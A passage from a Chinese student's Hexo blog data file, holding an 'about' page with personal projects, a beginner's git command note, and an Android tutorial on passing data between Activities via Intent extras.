https://github.com/fenlan/ChatTool　|\n|   BookShop     |   利用laravel框架编写的网上书店     |   http://fenlan96.com/ |\n|   云计算课程项目     |   利用kafka、redis、hbase、spark构建的一套消息接收、处理、呈现系统     |   https://github.com/fenlan?tab=repositories |\n|   nginx实时日志统计 |  利用Storm框架进行实时计算的nginx日志统计系统　|  https://github.com/fenlan/storm-nginx-log |\n\n## 推荐几部剧\n![Mr. Robot](/images/mr_robot.png)\n<p align=\"center\">Mr. Robot</p>\n![Stitchers](/images/stitchers.png)\n<p align=\"center\">Stitchers</p>\n![The Matrix](/images/the_matrix.png)\n<p align=\"center\">The Matrix</p>\n![G.I. Joe: The Rise of Cobra](/images/cobra.png)\n<p align=\"center\">G.I. Joe: The Rise of Cobra</p>","updated":"2018-04-08T08:35:39.256Z","path":"about/index.html","comments":1,"layout":"page","_id":"cjgrjscwg0001yp0l7zwzm5tu","content":"<h2 id=\"一点点音讯\"><a href=\"#一点点音讯\" class=\"headerlink\" title=\"一点点音讯\"></a>一点点音讯</h2><p>本人大三流浪一枚，游走在一些有趣却又觉得用处不大的东西之间，个人意向<code>分布式计算</code>和<code>Java后台</code>。写过<code>java</code>、<code>c++</code>、<code>php</code>，干过<code>Android</code>开发，做过<code>laravel</code> <code>spring boot</code>项目。对<code>linux</code>情有独钟，但好像也没有特别清楚的方向去深究，自学能力较好，想做全栈还是个菜鸟。学习了一段时间<code>kafka</code>、<code>storm</code>，对<code>spark</code>有一定了解，了解<code>Redis</code>持久化。</p>\n<p>异于喜欢二次元的宅男，本人只追国漫秦时七八载，贴上痴迷的大叔二叔<br><img src=\"http://m13.mask9.com/sites/default/files/styles/l/public/imagepad/20130929/20130929035607-3c3730f510e613e4b06b3b6c6f83fd3f831b9ee1.28/animation-qinshimingyue-mask9.jpg\" alt=\"\"></p>\n<p>生活挑剔多变，性格沉闷，话少却爱吹牛，稍带一点强迫症症状。游戏玩得偏少，已剧慌好久，但极爱看美帝科幻。</p>\n<h2 id=\"个人项目\"><a href=\"#个人项目\" class=\"headerlink\" title=\"个人项目\"></a>个人项目</h2><table>\n<thead>\n<tr>\n<th>项目</th>\n<th>简介</th>\n<th>地址</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>ChatTool</td>\n<td>利用极光推送编写的类似QQ的简易聊天软件</td>\n<td><a href=\"https://github.com/fenlan/ChatTool\" target=\"_blank\" rel=\"external\">https://github.com/fenlan/ChatTool</a>　</td>\n</tr>\n<tr>\n<td>BookShop</td>\n<td>利用laravel框架编写的网上书店</td>\n<td><a href=\"http://fenlan96.com/\" target=\"_blank\" rel=\"external\">http://fenlan96.com/</a></td>\n</tr>\n<tr>\n<td>云计算课程项目</td>\n<td>利用kafka、redis、hbase、spark构建的一套消息接收、处理、呈现系统</td>\n<td><a href=\"https://github.com/fenlan?tab=repositories\" target=\"_blank\" rel=\"external\">https://github.com/fenlan?tab=repositories</a></td>\n</tr>\n<tr>\n<td>nginx实时日志统计</td>\n<td>利用Storm框架进行实时计算的nginx日志统计系统　</td>\n<td><a href=\"https://github.com/fenlan/storm-nginx-log\" target=\"_blank\" rel=\"external\">https://github.com/fenlan/storm-nginx-log</a></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"推荐几部剧\"><a href=\"#推荐几部剧\" class=\"headerlink\" title=\"推荐几部剧\"></a>推荐几部剧</h2><p><img src=\"/images/mr_robot.png\" alt=\"Mr. Robot\"></p>\n<p align=\"center\">Mr. Robot</p><br><img src=\"/images/stitchers.png\" alt=\"Stitchers\"><br><p align=\"center\">Stitchers</p><br><img src=\"/images/the_matrix.png\" alt=\"The Matrix\"><br><p align=\"center\">The Matrix</p><br><img src=\"/images/cobra.png\" alt=\"G.I. Joe: The Rise of Cobra\"><br><p align=\"center\">G.I. Joe: The Rise of Cobra</p>","excerpt":"","more":"<h2 id=\"一点点音讯\"><a href=\"#一点点音讯\" class=\"headerlink\" title=\"一点点音讯\"></a>一点点音讯</h2><p>本人大三流浪一枚，游走在一些有趣却又觉得用处不大的东西之间，个人意向<code>分布式计算</code>和<code>Java后台</code>。写过<code>java</code>、<code>c++</code>、<code>php</code>，干过<code>Android</code>开发，做过<code>laravel</code> <code>spring boot</code>项目。对<code>linux</code>情有独钟，但好像也没有特别清楚的方向去深究，自学能力较好，想做全栈还是个菜鸟。学习了一段时间<code>kafka</code>、<code>storm</code>，对<code>spark</code>有一定了解，了解<code>Redis</code>持久化。</p>\n<p>异于喜欢二次元的宅男，本人只追国漫秦时七八载，贴上痴迷的大叔二叔<br><img src=\"http://m13.mask9.com/sites/default/files/styles/l/public/imagepad/20130929/20130929035607-3c3730f510e613e4b06b3b6c6f83fd3f831b9ee1.28/animation-qinshimingyue-mask9.jpg\" alt=\"\"></p>\n<p>生活挑剔多变，性格沉闷，话少却爱吹牛，稍带一点强迫症症状。游戏玩得偏少，已剧慌好久，但极爱看美帝科幻。</p>\n<h2 id=\"个人项目\"><a href=\"#个人项目\" class=\"headerlink\" title=\"个人项目\"></a>个人项目</h2><table>\n<thead>\n<tr>\n<th>项目</th>\n<th>简介</th>\n<th>地址</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>ChatTool</td>\n<td>利用极光推送编写的类似QQ的简易聊天软件</td>\n<td><a href=\"https://github.com/fenlan/ChatTool\">https://github.com/fenlan/ChatTool</a>　</td>\n</tr>\n<tr>\n<td>BookShop</td>\n<td>利用laravel框架编写的网上书店</td>\n<td><a href=\"http://fenlan96.com/\">http://fenlan96.com/</a></td>\n</tr>\n<tr>\n<td>云计算课程项目</td>\n<td>利用kafka、redis、hbase、spark构建的一套消息接收、处理、呈现系统</td>\n<td><a href=\"https://github.com/fenlan?tab=repositories\">https://github.com/fenlan?tab=repositories</a></td>\n</tr>\n<tr>\n<td>nginx实时日志统计</td>\n<td>利用Storm框架进行实时计算的nginx日志统计系统　</td>\n<td><a href=\"https://github.com/fenlan/storm-nginx-log\">https://github.com/fenlan/storm-nginx-log</a></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"推荐几部剧\"><a href=\"#推荐几部剧\" class=\"headerlink\" title=\"推荐几部剧\"></a>推荐几部剧</h2><p><img src=\"/images/mr_robot.png\" alt=\"Mr. Robot\"></p>\n<p align=\"center\">Mr. Robot</p><br><img src=\"/images/stitchers.png\" alt=\"Stitchers\"><br><p align=\"center\">Stitchers</p><br><img src=\"/images/the_matrix.png\" alt=\"The Matrix\"><br><p align=\"center\">The Matrix</p><br><img src=\"/images/cobra.png\" alt=\"G.I. Joe: The Rise of Cobra\"><br><p align=\"center\">G.I. Joe: The Rise of Cobra</p>"},{"title":"categories","date":"2017-11-28T02:37:43.000Z","type":"categories","_content":"","source":"categories/index.md","raw":"---\ntitle: categories\ndate: 2017-11-28 10:37:43\ntype: \"categories\"\n---\n","updated":"2017-11-28T02:44:37.353Z","path":"categories/index.html","comments":1,"layout":"page","_id":"cjgrjscwl0003yp0lyqyufhxp","content":"","excerpt":"","more":""},{"_content":"---\ntitle: git_install\ndate: 2016-05-21 11:37:22\n---now I'm testing this new page, so.....\n\n\ngit install and setting:\n$ git config –global user.name “name”\n$ git config –global user.email “email”\n$ git config –global color.ui auto\nand then create a new directory as tutorial\n$ mkdir tutorial\n$ cd tutorial\n$ git init\nthen create a new file as text.txt\n$ git status\n$ git add text.txt\n$ git status\n$ git commit -m “text”\n$ git status\n$ git log\nnext to rename the “https://…….” as origin\n$ git remote add origin https://.........(do this only the first time)\n$ git push -u origin master (the first time)\n$ git push -u origin (do this the next time)\ndo clone the date-base(数据库，不知道是不是这个词)\n$ git clone https://……. tutorial2(a new directory)\ndo pull file in your date-base\n$ git pull origin master\n$ git log\nfinally do another setting to make it better,but I meet a problem.\nSo I stop it temporarily,continue it if I have time.","source":"git-install/index.md","raw":"---\ntitle: git_install\ndate: 2016-05-21 11:37:22\n---now I'm testing this new page, so.....\n\n\ngit install and setting:\n$ git config –global user.name “name”\n$ git config –global user.email “email”\n$ git config –global color.ui auto\nand then create a new directory as tutorial\n$ mkdir tutorial\n$ cd tutorial\n$ git init\nthen create a new file as text.txt\n$ git status\n$ git add text.txt\n$ git status\n$ git commit -m “text”\n$ git status\n$ git log\nnext to rename the “https://…….” as origin\n$ git remote add origin https://.........(do this only the first time)\n$ git push -u origin master (the first time)\n$ git push -u origin (do this the next time)\ndo clone the date-base(数据库，不知道是不是这个词)\n$ git clone https://……. tutorial2(a new directory)\ndo pull file in your date-base\n$ git pull origin master\n$ git log\nfinally do another setting to make it better,but I meet a problem.\nSo I stop it temporarily,continue it if I have time.","date":"2017-06-13T12:16:45.469Z","updated":"2016-05-22T10:10:19.308Z","path":"git-install/index.html","title":"","comments":1,"layout":"page","_id":"cjgrjscwu0007yp0lsvdqybmy","content":"<hr>\n<p>title: git_install<br>date: 2016-05-21 11:37:22<br>—now I’m testing this new page, so…..</p>\n<p>git install and setting:<br>$ git config –global user.name “name”<br>$ git config –global user.email “email”<br>$ git config –global color.ui auto<br>and then create a new directory as tutorial<br>$ mkdir tutorial<br>$ cd tutorial<br>$ git init<br>then create a new file as text.txt<br>$ git status<br>$ git add text.txt<br>$ git status<br>$ git commit -m “text”<br>$ git status<br>$ git log<br>next to rename the “<a href=\"https://…….”\" target=\"_blank\" rel=\"external\">https://…….”</a> as origin<br>$ git remote add origin <a href=\"https://.........(do\" target=\"_blank\" rel=\"external\">https://.........(do</a> this only the first time)<br>$ git push -u origin master (the first time)<br>$ git push -u origin (do this the next time)<br>do clone the date-base(数据库，不知道是不是这个词)<br>$ git clone <a href=\"https://……\" target=\"_blank\" rel=\"external\">https://……</a>. tutorial2(a new directory)<br>do pull file in your date-base<br>$ git pull origin master<br>$ git log<br>finally do another setting to make it better,but I meet a problem.<br>So I stop it temporarily,continue it if I have time.</p>\n","excerpt":"","more":"<hr>\n<p>title: git_install<br>date: 2016-05-21 11:37:22<br>—now I’m testing this new page, so…..</p>\n<p>git install and setting:<br>$ git config –global user.name “name”<br>$ git config –global user.email “email”<br>$ git config –global color.ui auto<br>and then create a new directory as tutorial<br>$ mkdir tutorial<br>$ cd tutorial<br>$ git init<br>then create a new file as text.txt<br>$ git status<br>$ git add text.txt<br>$ git status<br>$ git commit -m “text”<br>$ git status<br>$ git log<br>next to rename the “<a href=\"https://…….”\">https://…….”</a> as origin<br>$ git remote add origin <a href=\"https://.........(do\">https://.........(do</a> this only the first time)<br>$ git push -u origin master (the first time)<br>$ git push -u origin (do this the next time)<br>do clone the date-base(数据库，不知道是不是这个词)<br>$ git clone <a href=\"https://……\">https://……</a>. tutorial2(a new directory)<br>do pull file in your date-base<br>$ git pull origin master<br>$ git log<br>finally do another setting to make it better,but I meet a problem.<br>So I stop it temporarily,continue it if I have time.</p>\n"},{"title":"guestbook","date":"2016-05-22T10:31:10.000Z","type":"guestbook","comments":1,"_content":"# 留言板\n","source":"guestbook/index.md","raw":"---\ntitle: guestbook\ndate: 2016-05-22 18:31:10\ntype: \"guestbook\"\ncomments: true\n---\n# 留言板\n","updated":"2016-05-23T10:43:40.597Z","path":"guestbook/index.html","layout":"page","_id":"cjgrjscwy0009yp0l842ab8wj","content":"<h1 id=\"留言板\"><a href=\"#留言板\" class=\"headerlink\" title=\"留言板\"></a>留言板</h1>","excerpt":"","more":"<h1 id=\"留言板\"><a href=\"#留言板\" class=\"headerlink\" title=\"留言板\"></a>留言板</h1>"},{"title":"tags","date":"2017-08-30T18:09:33.000Z","type":"tags","_content":"","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2017-08-31 02:09:33\ntype: \"tags\"\n---\n","updated":"2017-08-30T18:10:53.733Z","path":"tags/index.html","comments":1,"layout":"page","_id":"cjgrjscx8000dyp0laikw27p7","content":"","excerpt":"","more":""}],"Post":[{"title":"Android在不同Activity之间传输数据","date":"2016-06-30T07:18:23.000Z","_content":"### Android中的数据传输\n\n<!--more-->\n**在Android中有几种层次的数据传输，首先说在同一Activity中的不同线程里面传输使用Handler来实现，具体怎么实现，在我的博客里有。还有就是在不同的Activity中进行数据传输，下面先放代码**\n\n**MainActivity中的代码**\n\n``` java\npackage com.example.administrator.myapplication;\n\nimport android.content.Intent;\nimport android.support.v7.app.AppCompatActivity;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.widget.EditText;\n\npublic class MainActivity extends AppCompatActivity {\n\n    private EditText editText;\n    public final static String MESSAGE = \"com.example\";\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n    }\n\n    public void sendMessage(View view){\n        Intent intent = new Intent(this,Main2Activity.class);\n        editText = (EditText)findViewById(R.id.EditTextId);\n        String message = editText.getText().toString();\n        intent.putExtra(MESSAGE,message);\n        startActivity(intent);\n    }\n}\n\n```\n\n**首先要定义一个字符标记**\n`public final static String MESSAGE = \"com.example\";`\n\n**然后再xml文件中编写Button设置**\n``` xml\n<Button\n        android:id=\"@+id/ButtonId\"\n        android:layout_width=\"wrap_content\"\n        android:onClick=\"sendMessage\"\n        android:text=\"send\"\n        style=\"@style/Widget.AppCompat.Button.Colored\"\n        android:layout_height=\"wrap_content\"\n        android:layout_below=\"@+id/EditTextId\"\n        android:layout_alignEnd=\"@+id/EditTextId\"\n        android:layout_marginTop=\"52dp\" />\n```\n\n**其中只要看这个设置**\n`android:onClick=\"sendMessage\"`\n\n**该设置是为Button设置监听器，然后将行为导向sendMessage方法**\n``` java\n public void sendMessage(View view){\n        Intent intent = new Intent(this,Main2Activity.class);\n        editText = (EditText)findViewById(R.id.EditTextId);\n        String message = editText.getText().toString();\n        intent.putExtra(MESSAGE,message);\n        startActivity(intent);\n    }\n```\n\n**在sendMessage方法里面只要是定义意图对象Intent来导向另外一个Activity，最后startActivity(intent)启动，其中用于将数据传输的介质是Extra-Message，主要方法是intent.putExtra(),然后在另一个Activity中得到该数据，使用方法**\n` String message = intent.getStringExtra(MainActivity.MESSAGE);`\n\n### 另一个Activity中的代码\n``` java\npackage com.example.administrator.myapplication;\n\nimport android.content.Intent;\nimport android.support.v7.app.AppCompatActivity;\nimport android.os.Bundle;\nimport android.widget.EditText;\nimport android.widget.TextView;\n\npublic class Main2Activity extends AppCompatActivity {\n\n    private TextView textView;\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main2);\n\n        textView = (TextView)findViewById(R.id.TextView2Id);\n        Intent intent = getIntent();\n        String message = intent.getStringExtra(MainActivity.MESSAGE);\n        textView.setText(message);\n    }\n}\n\n```\n\n**同时要留意这行代码**\n`Intent intent = getIntent();`\n\n**具体怎么个传输步骤还得多看代码，一直看，看到懂为止**","source":"_posts/Android数据传输.md","raw":"---\ntitle: Android在不同Activity之间传输数据\ntags: Android数据传输\ndate: 2016-06-30 15:18:23\ncategories: Android\n---\n### Android中的数据传输\n\n<!--more-->\n**在Android中有几种层次的数据传输，首先说在同一Activity中的不同线程里面传输使用Handler来实现，具体怎么实现，在我的博客里有。还有就是在不同的Activity中进行数据传输，下面先放代码**\n\n**MainActivity中的代码**\n\n``` java\npackage com.example.administrator.myapplication;\n\nimport android.content.Intent;\nimport android.support.v7.app.AppCompatActivity;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.widget.EditText;\n\npublic class MainActivity extends AppCompatActivity {\n\n    private EditText editText;\n    public final static String MESSAGE = \"com.example\";\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n    }\n\n    public void sendMessage(View view){\n        Intent intent = new Intent(this,Main2Activity.class);\n        editText = (EditText)findViewById(R.id.EditTextId);\n        String message = editText.getText().toString();\n        intent.putExtra(MESSAGE,message);\n        startActivity(intent);\n    }\n}\n\n```\n\n**首先要定义一个字符标记**\n`public final static String MESSAGE = \"com.example\";`\n\n**然后再xml文件中编写Button设置**\n``` xml\n<Button\n        android:id=\"@+id/ButtonId\"\n        android:layout_width=\"wrap_content\"\n        android:onClick=\"sendMessage\"\n        android:text=\"send\"\n        style=\"@style/Widget.AppCompat.Button.Colored\"\n        android:layout_height=\"wrap_content\"\n        android:layout_below=\"@+id/EditTextId\"\n        android:layout_alignEnd=\"@+id/EditTextId\"\n        android:layout_marginTop=\"52dp\" />\n```\n\n**其中只要看这个设置**\n`android:onClick=\"sendMessage\"`\n\n**该设置是为Button设置监听器，然后将行为导向sendMessage方法**\n``` java\n public void sendMessage(View view){\n        Intent intent = new Intent(this,Main2Activity.class);\n        editText = (EditText)findViewById(R.id.EditTextId);\n        String message = editText.getText().toString();\n        intent.putExtra(MESSAGE,message);\n        startActivity(intent);\n    }\n```\n\n**在sendMessage方法里面只要是定义意图对象Intent来导向另外一个Activity，最后startActivity(intent)启动，其中用于将数据传输的介质是Extra-Message，主要方法是intent.putExtra(),然后在另一个Activity中得到该数据，使用方法**\n` String message = intent.getStringExtra(MainActivity.MESSAGE);`\n\n### 另一个Activity中的代码\n``` java\npackage com.example.administrator.myapplication;\n\nimport android.content.Intent;\nimport android.support.v7.app.AppCompatActivity;\nimport android.os.Bundle;\nimport android.widget.EditText;\nimport android.widget.TextView;\n\npublic class Main2Activity extends AppCompatActivity {\n\n    private TextView textView;\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main2);\n\n        textView = (TextView)findViewById(R.id.TextView2Id);\n        Intent intent = getIntent();\n        String message = intent.getStringExtra(MainActivity.MESSAGE);\n        textView.setText(message);\n    }\n}\n\n```\n\n**同时要留意这行代码**\n`Intent intent = getIntent();`\n\n**具体怎么个传输步骤还得多看代码，一直看，看到懂为止**","slug":"Android数据传输","published":1,"updated":"2017-11-28T03:02:35.437Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjscw80000yp0lusnvqgpb","content":"<h3 id=\"Android中的数据传输\"><a href=\"#Android中的数据传输\" class=\"headerlink\" title=\"Android中的数据传输\"></a>Android中的数据传输</h3><a id=\"more\"></a>\n<p><strong>在Android中有几种层次的数据传输，首先说在同一Activity中的不同线程里面传输使用Handler来实现，具体怎么实现，在我的博客里有。还有就是在不同的Activity中进行数据传输，下面先放代码</strong></p>\n<p><strong>MainActivity中的代码</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.example.administrator.myapplication;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> android.content.Intent;</span><br><span class=\"line\"><span class=\"keyword\">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class=\"line\"><span class=\"keyword\">import</span> android.os.Bundle;</span><br><span class=\"line\"><span class=\"keyword\">import</span> android.view.View;</span><br><span class=\"line\"><span class=\"keyword\">import</span> android.widget.EditText;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MainActivity</span> <span class=\"keyword\">extends</span> <span class=\"title\">AppCompatActivity</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> EditText editText;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">static</span> String MESSAGE = <span class=\"string\">\"com.example\"</span>;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">onCreate</span><span class=\"params\">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>.onCreate(savedInstanceState);</span><br><span class=\"line\">        setContentView(R.layout.activity_main);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">sendMessage</span><span class=\"params\">(View view)</span></span>&#123;</span><br><span class=\"line\">        Intent intent = <span class=\"keyword\">new</span> Intent(<span class=\"keyword\">this</span>,Main2Activity.class);</span><br><span class=\"line\">        editText = (EditText)findViewById(R.id.EditTextId);</span><br><span class=\"line\">        String message = editText.getText().toString();</span><br><span class=\"line\">        intent.putExtra(MESSAGE,message);</span><br><span class=\"line\">        startActivity(intent);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>首先要定义一个字符标记</strong><br><code>public final static String MESSAGE = &quot;com.example&quot;;</code></p>\n<p><strong>然后再xml文件中编写Button设置</strong><br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">Button</span></span><br><span class=\"line\">        <span class=\"attr\">android:id</span>=<span class=\"string\">\"@+id/ButtonId\"</span></span><br><span class=\"line\">        <span class=\"attr\">android:layout_width</span>=<span class=\"string\">\"wrap_content\"</span></span><br><span class=\"line\">        <span class=\"attr\">android:onClick</span>=<span class=\"string\">\"sendMessage\"</span></span><br><span class=\"line\">        <span class=\"attr\">android:text</span>=<span class=\"string\">\"send\"</span></span><br><span class=\"line\">        <span class=\"attr\">style</span>=<span class=\"string\">\"@style/Widget.AppCompat.Button.Colored\"</span></span><br><span class=\"line\">        <span class=\"attr\">android:layout_height</span>=<span class=\"string\">\"wrap_content\"</span></span><br><span class=\"line\">        <span class=\"attr\">android:layout_below</span>=<span class=\"string\">\"@+id/EditTextId\"</span></span><br><span class=\"line\">        <span class=\"attr\">android:layout_alignEnd</span>=<span class=\"string\">\"@+id/EditTextId\"</span></span><br><span class=\"line\">        <span class=\"attr\">android:layout_marginTop</span>=<span class=\"string\">\"52dp\"</span> /&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p><strong>其中只要看这个设置</strong><br><code>android:onClick=&quot;sendMessage&quot;</code></p>\n<p><strong>该设置是为Button设置监听器，然后将行为导向sendMessage方法</strong><br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">sendMessage</span><span class=\"params\">(View view)</span></span>&#123;</span><br><span class=\"line\">       Intent intent = <span class=\"keyword\">new</span> Intent(<span class=\"keyword\">this</span>,Main2Activity.class);</span><br><span class=\"line\">       editText = (EditText)findViewById(R.id.EditTextId);</span><br><span class=\"line\">       String message = editText.getText().toString();</span><br><span class=\"line\">       intent.putExtra(MESSAGE,message);</span><br><span class=\"line\">       startActivity(intent);</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>在sendMessage方法里面只要是定义意图对象Intent来导向另外一个Activity，最后startActivity(intent)启动，其中用于将数据传输的介质是Extra-Message，主要方法是intent.putExtra(),然后在另一个Activity中得到该数据，使用方法</strong><br><code>String message = intent.getStringExtra(MainActivity.MESSAGE);</code></p>\n<h3 id=\"另一个Activity中的代码\"><a href=\"#另一个Activity中的代码\" class=\"headerlink\" title=\"另一个Activity中的代码\"></a>另一个Activity中的代码</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.example.administrator.myapplication;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> android.content.Intent;</span><br><span class=\"line\"><span class=\"keyword\">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class=\"line\"><span class=\"keyword\">import</span> android.os.Bundle;</span><br><span class=\"line\"><span class=\"keyword\">import</span> android.widget.EditText;</span><br><span class=\"line\"><span class=\"keyword\">import</span> android.widget.TextView;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Main2Activity</span> <span class=\"keyword\">extends</span> <span class=\"title\">AppCompatActivity</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> TextView textView;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">onCreate</span><span class=\"params\">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>.onCreate(savedInstanceState);</span><br><span class=\"line\">        setContentView(R.layout.activity_main2);</span><br><span class=\"line\"></span><br><span class=\"line\">        textView = (TextView)findViewById(R.id.TextView2Id);</span><br><span class=\"line\">        Intent intent = getIntent();</span><br><span class=\"line\">        String message = intent.getStringExtra(MainActivity.MESSAGE);</span><br><span class=\"line\">        textView.setText(message);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>同时要留意这行代码</strong><br><code>Intent intent = getIntent();</code></p>\n<p><strong>具体怎么个传输步骤还得多看代码，一直看，看到懂为止</strong></p>\n","excerpt":"<h3 id=\"Android中的数据传输\"><a href=\"#Android中的数据传输\" class=\"headerlink\" title=\"Android中的数据传输\"></a>Android中的数据传输</h3>","more":"<p><strong>在Android中有几种层次的数据传输，首先说在同一Activity中的不同线程里面传输使用Handler来实现，具体怎么实现，在我的博客里有。还有就是在不同的Activity中进行数据传输，下面先放代码</strong></p>\n<p><strong>MainActivity中的代码</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.example.administrator.myapplication;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> android.content.Intent;</span><br><span class=\"line\"><span class=\"keyword\">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class=\"line\"><span class=\"keyword\">import</span> android.os.Bundle;</span><br><span class=\"line\"><span class=\"keyword\">import</span> android.view.View;</span><br><span class=\"line\"><span class=\"keyword\">import</span> android.widget.EditText;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MainActivity</span> <span class=\"keyword\">extends</span> <span class=\"title\">AppCompatActivity</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> EditText editText;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">static</span> String MESSAGE = <span class=\"string\">\"com.example\"</span>;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">onCreate</span><span class=\"params\">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>.onCreate(savedInstanceState);</span><br><span class=\"line\">        setContentView(R.layout.activity_main);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">sendMessage</span><span class=\"params\">(View view)</span></span>&#123;</span><br><span class=\"line\">        Intent intent = <span 